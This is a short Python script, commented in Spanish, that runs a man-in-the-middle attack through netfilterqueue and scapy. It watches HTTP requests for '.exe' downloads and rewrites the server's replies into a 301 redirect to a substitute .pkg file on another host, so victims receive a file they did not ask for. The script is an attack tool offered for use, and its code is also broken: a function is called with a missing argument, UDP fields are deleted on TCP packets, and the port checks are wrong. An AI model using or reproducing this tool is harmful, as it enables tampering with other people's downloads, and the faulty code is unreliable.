import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].len
    del packet[scapy.UDP].chksum
    return packet

def processs_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] EXE Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].dport == 80:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
               
                print("[+] Reemplazando Archivos")
                modified_packet = set_load("HTTP/1.1 301 Moved Permantly\nLocation: http://zeus.dl.playstation.net/cdn/UP9000/NPUA80011_00/qIdxQemidtF97Ai2LaYavuDAA71gdBaSdBlI5cgcaCROBv5PKXJGqy8FHVLE1FLxD7UPUelcdB97UBGrw10Y08kv0k5WdHL3gmu0q.pkg\n\n")

                packet.set_payload(bytes(modified_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processs_packet)
queue.run()
